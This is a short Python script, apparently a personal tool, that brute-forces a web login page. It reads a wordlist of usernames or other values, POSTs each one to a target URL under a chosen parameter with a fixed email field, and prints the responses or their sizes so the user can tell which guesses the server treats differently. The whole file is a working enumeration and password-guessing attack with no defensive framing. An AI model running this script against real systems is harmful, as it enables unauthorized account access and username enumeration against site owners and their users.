import urllib.request
import urllib.parse
import argparse

# A quick brute force script
# Usage example: python3 brute.py --url http://targeturl.com/login.php --source usernames.txt --post usernames

# This script:
    # Takes the target url
    # Reads a file of inputs line by line to define what data we are going to send
    # Takes the name of the parameter so it can be posted correctly
    # Throws it all at the server and gives you the output
    # Basically...it's curl...with a for loop...

parser = argparse.ArgumentParser()
parser.add_argument("--url", help="the target URL", type=str)
parser.add_argument("--source", help="the file where you can find the list of inputs, e.g. usernames", type=str)
parser.add_argument("--post", help="the name of the post parameter sent in the request", type=str)
parser.add_argument("--output", help="how you want to view the responses (size = size of the response; response = raw response; all = show both)", type=str)
args = parser.parse_args()

if args.url:
    url = args.url
else:
    print("Set the target (e.g. http://www.website.com/login.php). You can also set this by using --url")
    url = input()
if args.source:
    filename = args.source
else:
    print("Use --source to set the list of inputs (e.g. usernames.txt)")
    filename = input()
if args.post:
    post_param = args.post
else:
    print("Use --post to set the parameter name you want to post (e.g. username)")
    post_param = input()
if args.output:
    output = args.output
else:
    output = "default"

with open(filename) as f:
    mylist = f.read().splitlines()

for word in mylist:
    print("############### Trying value: " + word + " ###############")
    values = "submit=1&" + post_param + "=" + word + "&email=alex.olsen"
    data = values.encode("utf-8")
    req = urllib.request.Request(url, data)
    response = urllib.request.urlopen(req)
    read_response = response.read()
    if (output == "response"):
        print(read_response)
    elif (output == "size"):
        print(len(read_response))
    elif (output == "all"):
        print(len(read_response))
        print(read_response)
    else:
        print(read_response)
